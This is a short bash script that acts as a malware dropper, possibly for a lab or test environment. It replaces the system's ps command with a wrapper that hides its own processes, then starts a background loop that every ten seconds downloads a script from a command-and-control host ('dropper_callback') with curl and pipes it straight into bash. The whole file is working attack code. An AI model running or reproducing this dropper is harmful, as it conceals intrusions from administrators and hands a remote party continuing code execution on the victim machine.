#!/bin/bash

echo "DROPPED"

# Replace ps with a filtered ps
PS=`which ps`
mv $PS /tmp/ps
cat <<'EOF' > /bin/ps
#!/bin/bash
/tmp/ps $@ | grep -v "notevil" | grep -v "dropper" | grep -v "/tmp/ps"
EOF
chmod a+x /bin/ps

# Drop in beaconing malware
cat <<'EOF' > /tmp/notevil.sh
while true; do
  curl -s http://dropper_callback:8080/c2.sh | bash
  sleep 10
done
EOF

chmod a+x /tmp/notevil.sh

/tmp/notevil.sh &
